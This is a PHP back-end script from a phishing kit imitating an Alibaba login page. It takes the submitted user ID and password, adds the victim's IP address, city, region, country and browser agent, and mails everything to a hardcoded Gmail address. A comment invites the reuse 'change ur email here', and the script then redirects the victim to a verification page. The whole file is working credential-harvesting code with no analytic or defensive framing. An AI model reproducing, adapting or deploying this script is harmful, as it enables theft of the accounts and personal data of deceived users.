<?php
if($_POST["formtext1"] != "" and $_POST["formtext2"] != ""){
require_once('geoplugin.class.php');

$geoplugin = new geoPlugin();
$geoplugin->locate();
if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
} 
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------A L I B A B A-----------------------\n";
$message .= "USER ID        : ".$_POST['formtext1']."\n";
$message .= "PASSWORD         : ".$_POST['formtext2']."\n";
$message .= "---------=IP Address & Date=---------\n";
$message .= "IP Address: ".$ip."\n";
$message .= "City: {$geoplugin->city}\n";
$message .= "Region: {$geoplugin->region}\n";
$message .= "Country Name: {$geoplugin->countryName}\n";
$message .= "Country Code: {$geoplugin->countryCode}\n";
$message .= "Date: ".$adddate."\n";
$message .= "Browser                :".$browserAgent."\n";
$message .= "---------------FRESH [SPAM] TOOLS DOT COM-------------\n";
//change ur email here
$send = "successful.drizzy@gmail.com";
$subject = "Result .$ip.";
$headers = "From: AliB@ba<customer-support@Spammers>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}

 
     header("Location: verify.php");
}else{
header("Location: index.php");
}

?>